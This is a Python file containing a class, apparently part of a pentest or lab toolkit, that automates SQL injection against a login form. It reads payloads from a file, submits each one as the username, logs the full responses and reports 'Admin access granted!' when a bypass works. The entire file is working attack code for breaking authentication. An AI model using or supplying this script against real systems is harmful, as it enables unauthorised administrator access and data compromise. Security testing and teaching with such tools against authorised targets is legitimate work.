import logging
import requests
import time

from http_client.http_client import HttpClient
from typing import Dict, Any, List

logging.basicConfig(level=logging.DEBUG)

class AttackExecutor:
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
        self.payloads = self.load_payloads('./payloads/SQLi_payloads.txt')

    def load_payloads(self, path: str) -> List[str]:
        with open(path, 'r') as file:
            return [line.strip() for line in file if line.strip()]

    def execute_login_attack(self, endpoint: str, username_param: str, password_param: str) -> str:
        for payload in self.payloads:
            data = {username_param: payload, password_param: "password"}
            logging.debug(f"Attempting to exploit login with data: {data}")
            try:
                response = self.http_client.post(endpoint, data=data)
                logging.debug(f"Response status code: {response.status_code}")
                logging.debug(f"Response text: {response.text}")
                if response.status_code == 200:
                    if "Admin access granted!" in response.text or "Welcome, admin" in response.text:
                        return "Admin access granted!"
                    else:
                        logging.debug(f"Unexpected response text: {response.text}")
            except requests.exceptions.HTTPError as e:
                logging.error(f"HTTP error occurred: {e}")
                logging.error(f"Response status code: {e.response.status_code}")
                logging.error(f"Response text: {e.response.text}")
            except requests.exceptions.ConnectionError as e:
                logging.error(f"Request exception occurred: {e}")
                return "Attack failed due to connection issues."
        return "Attack failed."
